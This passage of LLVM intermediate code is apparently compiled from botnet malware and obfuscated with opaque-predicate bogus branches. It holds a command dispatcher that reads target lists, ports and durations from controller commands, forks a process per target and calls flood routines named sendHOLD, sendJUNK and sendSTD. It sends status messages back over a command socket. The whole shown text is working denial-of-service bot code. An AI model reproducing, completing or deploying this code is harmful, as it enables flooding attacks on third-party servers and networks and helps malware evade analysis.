; <label>:1154:                                   ; preds = %1152, %1053
  br label %1155

; <label>:1155:                                   ; preds = %1154, %originalBBpart2108
  %1156 = load i32, i32* @x.119
  %1157 = load i32, i32* @y.120
  %1158 = sub i32 %1156, 1
  %1159 = mul i32 %1156, %1158
  %1160 = urem i32 %1159, 2
  %1161 = icmp eq i32 %1160, 0
  %1162 = icmp slt i32 %1157, 10
  %1163 = or i1 %1161, %1162
  br i1 %1163, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %1155
  %1164 = load i8**, i8*** %4, align 8
  %1165 = getelementptr inbounds i8*, i8** %1164, i64 0
  %1166 = load i8*, i8** %1165, align 8
  %1167 = call i32 @strcmp(i8* %1166, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.464, i32 0, i32 0)) #10
  %1168 = icmp ne i32 %1167, 0
  %1169 = load i32, i32* @x.119
  %1170 = load i32, i32* @y.120
  %1171 = sub i32 %1169, 1
  %1172 = mul i32 %1169, %1171
  %1173 = urem i32 %1172, 2
  %1174 = icmp eq i32 %1173, 0
  %1175 = icmp slt i32 %1170, 10
  %1176 = or i1 %1174, %1175
  br i1 %1176, label %originalBBpart2120, label %originalBB118alteredBB

originalBBpart2120:                               ; preds = %originalBB118
  br i1 %1168, label %1365, label %1177

; <label>:1177:                                   ; preds = %originalBBpart2120
  %1178 = load i32, i32* %3, align 4
  %1179 = icmp slt i32 %1178, 4
  br i1 %1179, label %1224, label %1180

; <label>:1180:                                   ; preds = %1177
  %1181 = load i32, i32* @x.119
  %1182 = load i32, i32* @y.120
  %1183 = sub i32 %1181, 1
  %1184 = mul i32 %1181, %1183
  %1185 = urem i32 %1184, 2
  %1186 = icmp eq i32 %1185, 0
  %1187 = icmp slt i32 %1182, 10
  %1188 = or i1 %1186, %1187
  br i1 %1188, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %1180
  %1189 = load i8**, i8*** %4, align 8
  %1190 = getelementptr inbounds i8*, i8** %1189, i64 2
  %1191 = load i8*, i8** %1190, align 8
  %1192 = call i32 @atoi(i8* %1191) #10
  %1193 = icmp slt i32 %1192, 1
  %1194 = load i32, i32* @x.119
  %1195 = load i32, i32* @y.120
  %1196 = sub i32 %1194, 1
  %1197 = mul i32 %1194, %1196
  %1198 = urem i32 %1197, 2
  %1199 = icmp eq i32 %1198, 0
  %1200 = icmp slt i32 %1195, 10
  %1201 = or i1 %1199, %1200
  br i1 %1201, label %originalBBpart2124, label %originalBB122alteredBB

originalBBpart2124:                               ; preds = %originalBB122
  br i1 %1193, label %1224, label %1202

; <label>:1202:                                   ; preds = %originalBBpart2124
  %1203 = load i32, i32* @x.119
  %1204 = load i32, i32* @y.120
  %1205 = sub i32 %1203, 1
  %1206 = mul i32 %1203, %1205
  %1207 = urem i32 %1206, 2
  %1208 = icmp eq i32 %1207, 0
  %1209 = icmp slt i32 %1204, 10
  %1210 = or i1 %1208, %1209
  br i1 %1210, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %1202
  %1211 = load i8**, i8*** %4, align 8
  %1212 = getelementptr inbounds i8*, i8** %1211, i64 3
  %1213 = load i8*, i8** %1212, align 8
  %1214 = call i32 @atoi(i8* %1213) #10
  %1215 = icmp slt i32 %1214, 1
  %1216 = load i32, i32* @x.119
  %1217 = load i32, i32* @y.120
  %1218 = sub i32 %1216, 1
  %1219 = mul i32 %1216, %1218
  %1220 = urem i32 %1219, 2
  %1221 = icmp eq i32 %1220, 0
  %1222 = icmp slt i32 %1217, 10
  %1223 = or i1 %1221, %1222
  br i1 %1223, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  br i1 %1215, label %1224, label %1243

; <label>:1224:                                   ; preds = %originalBBpart2128, %originalBBpart2124, %1177
  %1225 = load i32, i32* @x.119
  %1226 = load i32, i32* @y.120
  %1227 = sub i32 %1225, 1
  %1228 = mul i32 %1225, %1227
  %1229 = urem i32 %1228, 2
  %1230 = icmp eq i32 %1229, 0
  %1231 = icmp slt i32 %1226, 10
  %1232 = or i1 %1230, %1231
  br i1 %1232, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %1224
  %1233 = load i32, i32* @mainCommSock, align 4
  %1234 = call i32 (i32, i8*, ...) @sockprintf(i32 %1233, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.465, i32 0, i32 0))
  %1235 = load i32, i32* @x.119
  %1236 = load i32, i32* @y.120
  %1237 = sub i32 %1235, 1
  %1238 = mul i32 %1235, %1237
  %1239 = urem i32 %1238, 2
  %1240 = icmp eq i32 %1239, 0
  %1241 = icmp slt i32 %1236, 10
  %1242 = or i1 %1240, %1241
  br i1 %1242, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br label %1784

; <label>:1243:                                   ; preds = %originalBBpart2128
  %1244 = load i32, i32* @x.119
  %1245 = load i32, i32* @y.120
  %1246 = sub i32 %1244, 1
  %1247 = mul i32 %1244, %1246
  %1248 = urem i32 %1247, 2
  %1249 = icmp eq i32 %1248, 0
  %1250 = icmp slt i32 %1245, 10
  %1251 = or i1 %1249, %1250
  br i1 %1251, label %originalBB134, label %originalBB134alteredBB

originalBB134:                                    ; preds = %originalBB134alteredBB, %1243
  %1252 = load i8**, i8*** %4, align 8
  %1253 = getelementptr inbounds i8*, i8** %1252, i64 1
  %1254 = load i8*, i8** %1253, align 8
  store i8* %1254, i8** %34, align 8
  %1255 = load i8**, i8*** %4, align 8
  %1256 = getelementptr inbounds i8*, i8** %1255, i64 2
  %1257 = load i8*, i8** %1256, align 8
  %1258 = call i32 @atoi(i8* %1257) #10
  store i32 %1258, i32* %35, align 4
  %1259 = load i8**, i8*** %4, align 8
  %1260 = getelementptr inbounds i8*, i8** %1259, i64 3
  %1261 = load i8*, i8** %1260, align 8
  %1262 = call i32 @atoi(i8* %1261) #10
  store i32 %1262, i32* %36, align 4
  %1263 = load i8*, i8** %34, align 8
  %1264 = call i8* @strstr(i8* %1263, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #10
  %1265 = icmp ne i8* %1264, null
  %1266 = load i32, i32* @x.119
  %1267 = load i32, i32* @y.120
  %1268 = sub i32 %1266, 1
  %1269 = mul i32 %1266, %1268
  %1270 = urem i32 %1269, 2
  %1271 = icmp eq i32 %1270, 0
  %1272 = icmp slt i32 %1267, 10
  %1273 = or i1 %1271, %1272
  br i1 %1273, label %originalBBpart2136, label %originalBB134alteredBB

originalBBpart2136:                               ; preds = %originalBB134
  br i1 %1265, label %1274, label %1324

; <label>:1274:                                   ; preds = %originalBBpart2136
  %1275 = load i8*, i8** %34, align 8
  %1276 = call i8* @strtok(i8* %1275, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %1276, i8** %37, align 8
  br label %1277

; <label>:1277:                                   ; preds = %originalBBpart2140, %1274
  %1278 = load i8*, i8** %37, align 8
  %1279 = icmp ne i8* %1278, null
  br i1 %1279, label %1280, label %1307

; <label>:1280:                                   ; preds = %1277
  %1281 = call i32 @listFork()
  %1282 = icmp ne i32 %1281, 0
  br i1 %1282, label %1289, label %1283

; <label>:1283:                                   ; preds = %1280
  %1284 = load i8*, i8** %37, align 8
  %1285 = load i32, i32* %35, align 4
  %1286 = load i32, i32* %36, align 4
  call void @sendHOLD(i8* %1284, i32 %1285, i32 %1286)
  %1287 = load i32, i32* @mainCommSock, align 4
  %1288 = call i32 @close(i32 %1287)
  call void @_exit(i32 0) #12
  unreachable

; <label>:1289:                                   ; preds = %1280
  %1290 = load i32, i32* @x.119
  %1291 = load i32, i32* @y.120
  %1292 = sub i32 %1290, 1
  %1293 = mul i32 %1290, %1292
  %1294 = urem i32 %1293, 2
  %1295 = icmp eq i32 %1294, 0
  %1296 = icmp slt i32 %1291, 10
  %1297 = or i1 %1295, %1296
  br i1 %1297, label %originalBB138, label %originalBB138alteredBB

originalBB138:                                    ; preds = %originalBB138alteredBB, %1289
  %1298 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %1298, i8** %37, align 8
  %1299 = load i32, i32* @x.119
  %1300 = load i32, i32* @y.120
  %1301 = sub i32 %1299, 1
  %1302 = mul i32 %1299, %1301
  %1303 = urem i32 %1302, 2
  %1304 = icmp eq i32 %1303, 0
  %1305 = icmp slt i32 %1300, 10
  %1306 = or i1 %1304, %1305
  br i1 %1306, label %originalBBpart2140, label %originalBB138alteredBB

originalBBpart2140:                               ; preds = %originalBB138
  br label %1277

; <label>:1307:                                   ; preds = %1277
  %1308 = load i32, i32* @x.119
  %1309 = load i32, i32* @y.120
  %1310 = sub i32 %1308, 1
  %1311 = mul i32 %1308, %1310
  %1312 = urem i32 %1311, 2
  %1313 = icmp eq i32 %1312, 0
  %1314 = icmp slt i32 %1309, 10
  %1315 = or i1 %1313, %1314
  br i1 %1315, label %originalBB142, label %originalBB142alteredBB

originalBB142:                                    ; preds = %originalBB142alteredBB, %1307
  %1316 = load i32, i32* @x.119
  %1317 = load i32, i32* @y.120
  %1318 = sub i32 %1316, 1
  %1319 = mul i32 %1316, %1318
  %1320 = urem i32 %1319, 2
  %1321 = icmp eq i32 %1320, 0
  %1322 = icmp slt i32 %1317, 10
  %1323 = or i1 %1321, %1322
  br i1 %1323, label %originalBBpart2144, label %originalBB142alteredBB

originalBBpart2144:                               ; preds = %originalBB142
  br label %1348

; <label>:1324:                                   ; preds = %originalBBpart2136
  %1325 = load i32, i32* @x.119
  %1326 = load i32, i32* @y.120
  %1327 = sub i32 %1325, 1
  %1328 = mul i32 %1325, %1327
  %1329 = urem i32 %1328, 2
  %1330 = icmp eq i32 %1329, 0
  %1331 = icmp slt i32 %1326, 10
  %1332 = or i1 %1330, %1331
  br i1 %1332, label %originalBB146, label %originalBB146alteredBB

originalBB146:                                    ; preds = %originalBB146alteredBB, %1324
  %1333 = call i32 @listFork()
  %1334 = icmp ne i32 %1333, 0
  %1335 = load i32, i32* @x.119
  %1336 = load i32, i32* @y.120
  %1337 = sub i32 %1335, 1
  %1338 = mul i32 %1335, %1337
  %1339 = urem i32 %1338, 2
  %1340 = icmp eq i32 %1339, 0
  %1341 = icmp slt i32 %1336, 10
  %1342 = or i1 %1340, %1341
  br i1 %1342, label %originalBBpart2148, label %originalBB146alteredBB

originalBBpart2148:                               ; preds = %originalBB146
  br i1 %1334, label %1343, label %1344

; <label>:1343:                                   ; preds = %originalBBpart2148
  br label %1784

; <label>:1344:                                   ; preds = %originalBBpart2148
  %1345 = load i8*, i8** %34, align 8
  %1346 = load i32, i32* %35, align 4
  %1347 = load i32, i32* %36, align 4
  call void @sendHOLD(i8* %1345, i32 %1346, i32 %1347)
  call void @_exit(i32 0) #12
  unreachable

; <label>:1348:                                   ; preds = %originalBBpart2144
  %1349 = load i32, i32* @x.119
  %1350 = load i32, i32* @y.120
  %1351 = sub i32 %1349, 1
  %1352 = mul i32 %1349, %1351
  %1353 = urem i32 %1352, 2
  %1354 = icmp eq i32 %1353, 0
  %1355 = icmp slt i32 %1350, 10
  %1356 = or i1 %1354, %1355
  br i1 %1356, label %originalBB150, label %originalBB150alteredBB

originalBB150:                                    ; preds = %originalBB150alteredBB, %1348
  %1357 = load i32, i32* @x.119
  %1358 = load i32, i32* @y.120
  %1359 = sub i32 %1357, 1
  %1360 = mul i32 %1357, %1359
  %1361 = urem i32 %1360, 2
  %1362 = icmp eq i32 %1361, 0
  %1363 = icmp slt i32 %1358, 10
  %1364 = or i1 %1362, %1363
  br i1 %1364, label %originalBBpart2152, label %originalBB150alteredBB

originalBBpart2152:                               ; preds = %originalBB150
  br label %1365

; <label>:1365:                                   ; preds = %originalBBpart2152, %originalBBpart2120
  %1366 = load i8**, i8*** %4, align 8
  %1367 = getelementptr inbounds i8*, i8** %1366, i64 0
  %1368 = load i8*, i8** %1367, align 8
  %1369 = call i32 @strcmp(i8* %1368, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.466, i32 0, i32 0)) #10
  %1370 = icmp ne i32 %1369, 0
  br i1 %1370, label %1489, label %1371

; <label>:1371:                                   ; preds = %1365
  %1372 = load i32, i32* %3, align 4
  %1373 = icmp slt i32 %1372, 3
  br i1 %1373, label %1380, label %1374

; <label>:1374:                                   ; preds = %1371
  %1375 = load i8**, i8*** %4, align 8
  %1376 = getelementptr inbounds i8*, i8** %1375, i64 3
  %1377 = load i8*, i8** %1376, align 8
  %1378 = call i32 @atoi(i8* %1377) #10
  %1379 = icmp slt i32 %1378, 0
  br i1 %1379, label %1380, label %1383

; <label>:1380:                                   ; preds = %1374, %1371
  %1381 = load i32, i32* @mainCommSock, align 4
  %1382 = call i32 (i32, i8*, ...) @sockprintf(i32 %1381, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.467, i32 0, i32 0))
  br label %1784

; <label>:1383:                                   ; preds = %1374
  %1384 = load i32, i32* @x.119
  %1385 = load i32, i32* @y.120
  %1386 = sub i32 %1384, 1
  %1387 = mul i32 %1384, %1386
  %1388 = urem i32 %1387, 2
  %1389 = icmp eq i32 %1388, 0
  %1390 = icmp slt i32 %1385, 10
  %1391 = or i1 %1389, %1390
  br i1 %1391, label %originalBB154, label %originalBB154alteredBB

originalBB154:                                    ; preds = %originalBB154alteredBB, %1383
  %1392 = load i8**, i8*** %4, align 8
  %1393 = getelementptr inbounds i8*, i8** %1392, i64 1
  %1394 = load i8*, i8** %1393, align 8
  store i8* %1394, i8** %38, align 8
  %1395 = load i8**, i8*** %4, align 8
  %1396 = getelementptr inbounds i8*, i8** %1395, i64 2
  %1397 = load i8*, i8** %1396, align 8
  %1398 = call i32 @atoi(i8* %1397) #10
  store i32 %1398, i32* %39, align 4
  %1399 = load i8**, i8*** %4, align 8
  %1400 = getelementptr inbounds i8*, i8** %1399, i64 3
  %1401 = load i8*, i8** %1400, align 8
  %1402 = call i32 @atoi(i8* %1401) #10
  store i32 %1402, i32* %40, align 4
  %1403 = load i8*, i8** %38, align 8
  %1404 = call i8* @strstr(i8* %1403, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #10
  %1405 = icmp ne i8* %1404, null
  %1406 = load i32, i32* @x.119
  %1407 = load i32, i32* @y.120
  %1408 = sub i32 %1406, 1
  %1409 = mul i32 %1406, %1408
  %1410 = urem i32 %1409, 2
  %1411 = icmp eq i32 %1410, 0
  %1412 = icmp slt i32 %1407, 10
  %1413 = or i1 %1411, %1412
  br i1 %1413, label %originalBBpart2156, label %originalBB154alteredBB

originalBBpart2156:                               ; preds = %originalBB154
  br i1 %1405, label %1414, label %1480

; <label>:1414:                                   ; preds = %originalBBpart2156
  %1415 = load i8*, i8** %38, align 8
  %1416 = call i8* @strtok(i8* %1415, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %1416, i8** %41, align 8
  br label %1417

; <label>:1417:                                   ; preds = %1461, %1414
  %1418 = load i32, i32* @x.119
  %1419 = load i32, i32* @y.120
  %1420 = sub i32 %1418, 1
  %1421 = mul i32 %1418, %1420
  %1422 = urem i32 %1421, 2
  %1423 = icmp eq i32 %1422, 0
  %1424 = icmp slt i32 %1419, 10
  %1425 = or i1 %1423, %1424
  br i1 %1425, label %originalBB158, label %originalBB158alteredBB

originalBB158:                                    ; preds = %originalBB158alteredBB, %1417
  %1426 = load i8*, i8** %41, align 8
  %1427 = icmp ne i8* %1426, null
  %1428 = load i32, i32* @x.119
  %1429 = load i32, i32* @y.120
  %1430 = sub i32 %1428, 1
  %1431 = mul i32 %1428, %1430
  %1432 = urem i32 %1431, 2
  %1433 = icmp eq i32 %1432, 0
  %1434 = icmp slt i32 %1429, 10
  %1435 = or i1 %1433, %1434
  br i1 %1435, label %originalBBpart2160, label %originalBB158alteredBB

originalBBpart2160:                               ; preds = %originalBB158
  br i1 %1427, label %1436, label %1463

; <label>:1436:                                   ; preds = %originalBBpart2160
  %1437 = load i32, i32* @x.119
  %1438 = load i32, i32* @y.120
  %1439 = sub i32 %1437, 1
  %1440 = mul i32 %1437, %1439
  %1441 = urem i32 %1440, 2
  %1442 = icmp eq i32 %1441, 0
  %1443 = icmp slt i32 %1438, 10
  %1444 = or i1 %1442, %1443
  br i1 %1444, label %originalBB162, label %originalBB162alteredBB

originalBB162:                                    ; preds = %originalBB162alteredBB, %1436
  %1445 = call i32 @listFork()
  %1446 = icmp ne i32 %1445, 0
  %1447 = load i32, i32* @x.119
  %1448 = load i32, i32* @y.120
  %1449 = sub i32 %1447, 1
  %1450 = mul i32 %1447, %1449
  %1451 = urem i32 %1450, 2
  %1452 = icmp eq i32 %1451, 0
  %1453 = icmp slt i32 %1448, 10
  %1454 = or i1 %1452, %1453
  br i1 %1454, label %originalBBpart2164, label %originalBB162alteredBB

originalBBpart2164:                               ; preds = %originalBB162
  br i1 %1446, label %1461, label %1455

; <label>:1455:                                   ; preds = %originalBBpart2164
  %1456 = load i8*, i8** %41, align 8
  %1457 = load i32, i32* %39, align 4
  %1458 = load i32, i32* %40, align 4
  call void @sendJUNK(i8* %1456, i32 %1457, i32 %1458)
  %1459 = load i32, i32* @mainCommSock, align 4
  %1460 = call i32 @close(i32 %1459)
  call void @_exit(i32 0) #12
  unreachable

; <label>:1461:                                   ; preds = %originalBBpart2164
  %1462 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %1462, i8** %41, align 8
  br label %1417

; <label>:1463:                                   ; preds = %originalBBpart2160
  %1464 = load i32, i32* @x.119
  %1465 = load i32, i32* @y.120
  %1466 = sub i32 %1464, 1
  %1467 = mul i32 %1464, %1466
  %1468 = urem i32 %1467, 2
  %1469 = icmp eq i32 %1468, 0
  %1470 = icmp slt i32 %1465, 10
  %1471 = or i1 %1469, %1470
  br i1 %1471, label %originalBB166, label %originalBB166alteredBB

originalBB166:                                    ; preds = %originalBB166alteredBB, %1463
  %1472 = load i32, i32* @x.119
  %1473 = load i32, i32* @y.120
  %1474 = sub i32 %1472, 1
  %1475 = mul i32 %1472, %1474
  %1476 = urem i32 %1475, 2
  %1477 = icmp eq i32 %1476, 0
  %1478 = icmp slt i32 %1473, 10
  %1479 = or i1 %1477, %1478
  br i1 %1479, label %originalBBpart2168, label %originalBB166alteredBB

originalBBpart2168:                               ; preds = %originalBB166
  br label %1488

; <label>:1480:                                   ; preds = %originalBBpart2156
  %1481 = call i32 @listFork()
  %1482 = icmp ne i32 %1481, 0
  br i1 %1482, label %1483, label %1484

; <label>:1483:                                   ; preds = %1480
  br label %1784

; <label>:1484:                                   ; preds = %1480
  %1485 = load i8*, i8** %38, align 8
  %1486 = load i32, i32* %39, align 4
  %1487 = load i32, i32* %40, align 4
  call void @sendJUNK(i8* %1485, i32 %1486, i32 %1487)
  call void @_exit(i32 0) #12
  unreachable

; <label>:1488:                                   ; preds = %originalBBpart2168
  br label %1489

; <label>:1489:                                   ; preds = %1488, %1365
  %1490 = load i8**, i8*** %4, align 8
  %1491 = getelementptr inbounds i8*, i8** %1490, i64 0
  %1492 = load i8*, i8** %1491, align 8
  %1493 = call i32 @strcmp(i8* %1492, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.468, i32 0, i32 0)) #10
  %1494 = icmp ne i32 %1493, 0
  br i1 %1494, label %1665, label %1495

; <label>:1495:                                   ; preds = %1489
  %1496 = load i32, i32* %3, align 4
  %1497 = icmp slt i32 %1496, 4
  br i1 %1497, label %1526, label %1498

; <label>:1498:                                   ; preds = %1495
  %1499 = load i8**, i8*** %4, align 8
  %1500 = getelementptr inbounds i8*, i8** %1499, i64 2
  %1501 = load i8*, i8** %1500, align 8
  %1502 = call i32 @atoi(i8* %1501) #10
  %1503 = icmp slt i32 %1502, 1
  br i1 %1503, label %1526, label %1504

; <label>:1504:                                   ; preds = %1498
  %1505 = load i32, i32* @x.119
  %1506 = load i32, i32* @y.120
  %1507 = sub i32 %1505, 1
  %1508 = mul i32 %1505, %1507
  %1509 = urem i32 %1508, 2
  %1510 = icmp eq i32 %1509, 0
  %1511 = icmp slt i32 %1506, 10
  %1512 = or i1 %1510, %1511
  br i1 %1512, label %originalBB170, label %originalBB170alteredBB

originalBB170:                                    ; preds = %originalBB170alteredBB, %1504
  %1513 = load i8**, i8*** %4, align 8
  %1514 = getelementptr inbounds i8*, i8** %1513, i64 3
  %1515 = load i8*, i8** %1514, align 8
  %1516 = call i32 @atoi(i8* %1515) #10
  %1517 = icmp slt i32 %1516, 1
  %1518 = load i32, i32* @x.119
  %1519 = load i32, i32* @y.120
  %1520 = sub i32 %1518, 1
  %1521 = mul i32 %1518, %1520
  %1522 = urem i32 %1521, 2
  %1523 = icmp eq i32 %1522, 0
  %1524 = icmp slt i32 %1519, 10
  %1525 = or i1 %1523, %1524
  br i1 %1525, label %originalBBpart2172, label %originalBB170alteredBB

originalBBpart2172:                               ; preds = %originalBB170
  br i1 %1517, label %1526, label %1545

; <label>:1526:                                   ; preds = %originalBBpart2172, %1498, %1495
  %1527 = load i32, i32* @x.119
  %1528 = load i32, i32* @y.120
  %1529 = sub i32 %1527, 1
  %1530 = mul i32 %1527, %1529
  %1531 = urem i32 %1530, 2
  %1532 = icmp eq i32 %1531, 0
  %1533 = icmp slt i32 %1528, 10
  %1534 = or i1 %1532, %1533
  br i1 %1534, label %originalBB174, label %originalBB174alteredBB

originalBB174:                                    ; preds = %originalBB174alteredBB, %1526
  %1535 = load i32, i32* @mainCommSock, align 4
  %1536 = call i32 (i32, i8*, ...) @sockprintf(i32 %1535, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.469, i32 0, i32 0))
  %1537 = load i32, i32* @x.119
  %1538 = load i32, i32* @y.120
  %1539 = sub i32 %1537, 1
  %1540 = mul i32 %1537, %1539
  %1541 = urem i32 %1540, 2
  %1542 = icmp eq i32 %1541, 0
  %1543 = icmp slt i32 %1538, 10
  %1544 = or i1 %1542, %1543
  br i1 %1544, label %originalBBpart2176, label %originalBB174alteredBB

originalBBpart2176:                               ; preds = %originalBB174
  br label %1784

; <label>:1545:                                   ; preds = %originalBBpart2172
  %1546 = load i8**, i8*** %4, align 8
  %1547 = getelementptr inbounds i8*, i8** %1546, i64 1
  %1548 = load i8*, i8** %1547, align 8
  store i8* %1548, i8** %42, align 8
  %1549 = load i8**, i8*** %4, align 8
  %1550 = getelementptr inbounds i8*, i8** %1549, i64 2
  %1551 = load i8*, i8** %1550, align 8
  %1552 = call i32 @atoi(i8* %1551) #10
  store i32 %1552, i32* %43, align 4
  %1553 = load i8**, i8*** %4, align 8
  %1554 = getelementptr inbounds i8*, i8** %1553, i64 3
  %1555 = load i8*, i8** %1554, align 8
  %1556 = call i32 @atoi(i8* %1555) #10
  store i32 %1556, i32* %44, align 4
  %1557 = load i8*, i8** %42, align 8
  %1558 = call i8* @strstr(i8* %1557, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #10
  %1559 = icmp ne i8* %1558, null
  br i1 %1559, label %1560, label %1624

; <label>:1560:                                   ; preds = %1545
  %1561 = load i8*, i8** %42, align 8
  %1562 = call i8* @strtok(i8* %1561, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %1562, i8** %45, align 8
  br label %1563

; <label>:1563:                                   ; preds = %originalBBpart2184, %1560
  %1564 = load i8*, i8** %45, align 8
  %1565 = icmp ne i8* %1564, null
  br i1 %1565, label %1566, label %1607

; <label>:1566:                                   ; preds = %1563
  %1567 = load i32, i32* @x.119
  %1568 = load i32, i32* @y.120
  %1569 = sub i32 %1567, 1
  %1570 = mul i32 %1567, %1569
  %1571 = urem i32 %1570, 2
  %1572 = icmp eq i32 %1571, 0
  %1573 = icmp slt i32 %1568, 10
  %1574 = or i1 %1572, %1573
  br i1 %1574, label %originalBB178, label %originalBB178alteredBB

originalBB178:                                    ; preds = %originalBB178alteredBB, %1566
  %1575 = call i32 @listFork()
  %1576 = icmp ne i32 %1575, 0
  %1577 = load i32, i32* @x.119
  %1578 = load i32, i32* @y.120
  %1579 = sub i32 %1577, 1
  %1580 = mul i32 %1577, %1579
  %1581 = urem i32 %1580, 2
  %1582 = icmp eq i32 %1581, 0
  %1583 = icmp slt i32 %1578, 10
  %1584 = or i1 %1582, %1583
  br i1 %1584, label %originalBBpart2180, label %originalBB178alteredBB

originalBBpart2180:                               ; preds = %originalBB178
  br i1 %1576, label %1589, label %1585

; <label>:1585:                                   ; preds = %originalBBpart2180
  %1586 = load i8*, i8** %45, align 8
  %1587 = load i32, i32* %43, align 4
  %1588 = load i32, i32* %44, align 4
  call void @sendSTD(i8* %1586, i32 %1587, i32 %1588)
  call void @_exit(i32 0) #12
  unreachable

; <label>:1589:                                   ; preds = %originalBBpart2180
  %1590 = load i32, i32* @x.119
  %1591 = load i32, i32* @y.120
  %1592 = sub i32 %1590, 1
  %1593 = mul i32 %1590, %1592
  %1594 = urem i32 %1593, 2
  %1595 = icmp eq i32 %1594, 0
  %1596 = icmp slt i32 %1591, 10
  %1597 = or i1 %1595, %1596
  br i1 %1597, label %originalBB182, label %originalBB182alteredBB

originalBB182:                                    ; preds = %originalBB182alteredBB, %1589
  %1598 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %1598, i8** %45, align 8
  %1599 = load i32, i32* @x.119
  %1600 = load i32, i32* @y.120
  %1601 = sub i32 %1599, 1
  %1602 = mul i32 %1599, %1601
  %1603 = urem i32 %1602, 2
  %1604 = icmp eq i32 %1603, 0
  %1605 = icmp slt i32 %1600, 10
  %1606 = or i1 %1604, %1605
  br i1 %1606, label %originalBBpart2184, label %originalBB182alteredBB

originalBBpart2184:                               ; preds = %originalBB182
  br label %1563

; <label>:1607:                                   ; preds = %1563
  %1608 = load i32, i32* @x.119
  %1609 = load i32, i32* @y.120
  %1610 = sub i32 %1608, 1
  %1611 = mul i32 %1608, %1610
  %1612 = urem i32 %1611, 2
  %1613 = icmp eq i32 %1612, 0
  %1614 = icmp slt i32 %1609, 10
  %1615 = or i1 %1613, %1614
  br i1 %1615, label %originalBB186, label %originalBB186alteredBB

originalBB186:                                    ; preds = %originalBB186alteredBB, %1607
  %1616 = load i32, i32* @x.119
  %1617 = load i32, i32* @y.120
  %1618 = sub i32 %1616, 1
  %1619 = mul i32 %1616, %1618
  %1620 = urem i32 %1619, 2
  %1621 = icmp eq i32 %1620, 0
  %1622 = icmp slt i32 %1617, 10
  %1623 = or i1 %1621, %1622
  br i1 %1623, label %originalBBpart2188, label %originalBB186alteredBB

originalBBpart2188:                               ; preds = %originalBB186
  br label %1648

; <label>:1624:                                   ; preds = %1545
  %1625 = call i32 @listFork()
  %1626 = icmp ne i32 %1625, 0
  br i1 %1626, label %1627, label %1644

; <label>:1627:                                   ; preds = %1624
  %1628 = load i32, i32* @x.119
  %1629 = load i32, i32* @y.120
  %1630 = sub i32 %1628, 1
  %1631 = mul i32 %1628, %1630
  %1632 = urem i32 %1631, 2
  %1633 = icmp eq i32 %1632, 0
  %1634 = icmp slt i32 %1629, 10
  %1635 = or i1 %1633, %1634
  br i1 %1635, label %originalBB190, label %originalBB190alteredBB

originalBB190:                                    ; preds = %originalBB190alteredBB, %1627
  %1636 = load i32, i32* @x.119
  %1637 = load i32, i32* @y.120
  %1638 = sub i32 %1636, 1
  %1639 = mul i32 %1636, %1638
  %1640 = urem i32 %1639, 2
  %1641 = icmp eq i32 %1640, 0
  %1642 = icmp slt i32 %1637, 10
  %1643 = or i1 %1641, %1642
  br i1 %1643, label %originalBBpart2192, label %originalBB190alteredBB

originalBBpart2192:                               ; preds = %originalBB190
  br label %1784

; <label>:1644:                                   ; preds = %1624
  %1645 = load i8*, i8** %42, align 8
  %1646 = load i32, i32* %43, align 4
  %1647 = load i32, i32* %44, align 4
  call void @sendSTD(i8* %1645, i32 %1646, i32 %1647)
  call void @_exit(i32 0) #12
  unreachable

; <label>:1648:                                   ; preds = %originalBBpart2188
  %1649 = load i32, i32* @x.119
  %1650 = load i32, i32* @y.120
  %1651 = sub i32 %1649, 1
  %1652 = mul i32 %1649, %1651
  %1653 = urem i32 %1652, 2
  %1654 = icmp eq i32 %1653, 0
  %1655 = icmp slt i32 %1650, 10
  %1656 = or i1 %1654, %1655
  br i1 %1656, label %originalBB194, label %originalBB194alteredBB

originalBB194:                                    ; preds = %originalBB194alteredBB, %1648
  %1657 = load i32, i32* @x.119
  %1658 = load i32, i32* @y.120
  %1659 = sub i32 %1657, 1
  %1660 = mul i32 %1657, %1659
  %1661 = urem i32 %1660, 2
  %1662 = icmp eq i32 %1661, 0
  %1663 = icmp slt i32 %1658, 10
  %1664 = or i1 %1662, %1663
  br i1 %1664, label %originalBBpart2196, label %originalBB194alteredBB

originalBBpart2196:                               ; preds = %originalBB194
  br label %1665

; <label>:1665:                                   ; preds = %originalBBpart2196, %1489
  %1666 = load i32, i32* @x.119
  %1667 = load i32, i32* @y.120
  %1668 = sub i32 %1666, 1
  %1669 = mul i32 %1666, %1668
  %1670 = urem i32 %1669, 2
  %1671 = icmp eq i32 %1670, 0
  %1672 = icmp slt i32 %1667, 10
  %1673 = or i1 %1671, %1672
  br i1 %1673, label %originalBB198, label %originalBB198alteredBB

originalBB198:                                    ; preds = %originalBB198alteredBB, %1665
  %1674 = load i8**, i8*** %4, align 8
  %1675 = getelementptr inbounds i8*, i8** %1674, i64 0
